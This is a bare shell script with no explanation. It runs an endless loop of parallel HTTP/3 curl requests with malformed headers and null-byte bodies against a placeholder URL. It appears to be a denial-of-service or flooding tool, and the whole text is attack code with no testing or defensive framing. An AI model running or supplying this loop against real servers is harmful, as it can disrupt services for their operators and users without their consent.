while true
do
   seq 1 10 | xargs -n1 -P10 timeout 1s curl -X GET URL -H "method: HEAD" -H "method: POST" -H "method: GET" -H "settings: 0" --data "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" --http3 -v -o /dev/null
done
